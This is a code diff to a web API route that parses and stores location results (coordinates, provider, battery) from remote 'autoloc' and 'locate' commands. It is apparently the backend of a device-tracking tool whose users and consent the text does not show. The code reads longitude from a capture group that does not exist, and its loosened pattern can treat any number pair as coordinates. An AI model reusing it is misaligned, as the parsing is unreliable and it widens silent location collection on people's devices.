@@ -38,8 +38,9 @@ export async function POST(req: Request) {
       }, { merge: true });
     }
 
-    // Save background autoloc tracking to locations subcollection (up to 5 items)
-    if (commandName === 'autoloc' || (commandName === 'locate' && (result.includes('maps.google.com') || result.includes('Lat:') || result.includes('lat:')))) {
+    // Save location tracking to locations subcollection (up to 5 items)
+    const isLocationResult = commandName === 'autoloc' || commandName === 'locate' || result.includes('maps.google.com') || result.includes('Lat:') || result.includes('lat:');
+    if (isLocationResult) {
       let lat = 0;
       let lon = 0;
       let mapsUrl = '';
@@ -50,8 +51,8 @@ export async function POST(req: Request) {
       let provider = 'GPS';
       let battery = '';
 
-      // Pattern 1: Maps URL (maps.google.com/maps?q=lat,lon or maps.google.com/?q=lat,lon)
-      const mapsMatch = result.match(/https?:\/\/[^\s]*[\?&](?:q|ll)=(-?\d+\.\d+),(-?\d+\.\d+)/);
+      // Pattern 1: Google Maps URL (supports query=, q=, ll=)
+      const mapsMatch = result.match(/https?:\/\/[^\s]*[\?&](?:q|ll|query)=(-?\d+(?:\.\d+)?),(-?\d+(?:\.\d+)?)/i);
       if (mapsMatch) {
         lat = parseFloat(mapsMatch[1]);
         lon = parseFloat(mapsMatch[2]);
@@ -60,17 +61,17 @@ export async function POST(req: Request) {
 
       // Pattern 2: Lat: 12.345 and Lon: 67.890
       if (!lat || !lon) {
-        const latMatch = result.match(/Lat(?:itude)?:\s*(-?\d+\.\d+)/i);
-        const lonMatch = result.match(/Lon(?:gitude)?:\s*(-?\d+\.\d+)/i);
+        const latMatch = result.match(/Lat(?:itude)?:\s*(-?\d+(?:\.\d+)?)/i);
+        const lonMatch = result.match(/Lon(?:gitude)?:\s*(-?\d+(?:\.\d+)?)/i);
         if (latMatch && lonMatch) {
           lat = parseFloat(latMatch[1]);
           lon = parseFloat(lonMatch[2]);
         }
       }
 
-      // Pattern 3: Direct pair "12.345, 67.890"
+      // Pattern 3: Direct coordinate pair "12.345, 67.890"
       if (!lat || !lon) {
-        const pairMatch = result.match(/(-?\d{1,2}\.\d+)\s*,\s*(-?\d{1,3}\.\d+)/);
+        const pairMatch = result.match(/(-?\d{1,2}(?:\.\d+)?)\s*,\s*(-?\d{1,3}(?:\.\d+)?)/);
         if (pairMatch) {
           lat = parseFloat(pairMatch[1]);
           lon = parseFloat(pairMatch[2]);
@@ -90,15 +91,15 @@ export async function POST(req: Request) {
       if (speedMatch) speed = speedMatch[1];
 
       const provMatch = result.match(/^([A-Za-z0-9_]+):/);
-      if (provMatch && provMatch[1] !== 'Lat' && provMatch[1] !== 'Lon' && provMatch[1] !== 'Time') {
+      if (provMatch && provMatch[1] !== 'Lat' && provMatch[1] !== 'Lon' && provMatch[1] !== 'Time' && provMatch[1] !== 'AutoLoc') {
         provider = provMatch[1];
       }
 
       const battMatch = result.match(/Battery:\s*(\d+\s*%)/i);
       if (battMatch) battery = battMatch[1];
 
-      // Only add to locations subcollection if we have valid coordinates or if autoloc
-      if ((lat && lon) || commandName === 'autoloc') {
+      // Save to locations subcollection whenever valid coordinates exist or for autoloc/locate
+      if ((lat !== 0 && lon !== 0) || commandName === 'autoloc' || commandName === 'locate') {
         const locRef = adminDb.collection('users').doc(userId).collection('locations');
         await locRef.add({
           command: commandName,
@@ -106,8 +107,8 @@ export async function POST(req: Request) {
           raw: result,
           timestamp: new Date().toISOString(),
           mapsUrl: mapsUrl || (lat && lon ? `https://maps.google.com/maps?q=${lat},${lon}` : ''),
-          lat,
-          lon,
+          lat: lat,
+          lon: lon,
           accuracy: accuracy || 'N/A',
           altitude: altitude || 'N/A',
           bearing: bearing || 'N/A',
